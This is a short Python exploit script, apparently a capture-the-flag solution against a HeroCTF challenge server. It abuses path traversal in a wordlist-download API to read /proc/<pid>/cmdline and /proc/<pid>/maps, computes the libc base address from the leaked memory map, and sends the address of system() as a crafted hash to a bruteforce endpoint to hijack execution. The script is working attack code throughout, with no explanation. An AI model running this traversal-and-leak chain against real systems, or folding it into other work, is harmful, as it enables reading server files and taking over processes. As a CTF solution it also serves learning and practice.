import requests
import json
from pwn import *

libc = ELF("libc.so.6")

endpoint = " http://dyn03.heroctf.fr:13070/"

for i in range(1,500):
    req = requests.post(endpoint + "api/wordlist/download", json={"filename": f"../../../../../proc/{i}/cmdline"})

    if("cracker" in req.text):
        break
leak = requests.post(endpoint + "api/wordlist/download", json={"filename":f"../../../../proc/{i}/maps"})

leak = json.loads(leak.text)['content'].split('\n')
libc_base = int(leak[17][:leak[17].find('-')], 16)

print(hex(libc_base))

payload = p64(libc_base + libc.symbols['system'])

req = requests.post(endpoint+"api/bruteforce", json={"algorithm": 22, "hash": payload.hex(), "wordlist": "shell.txt"})

print(req.text)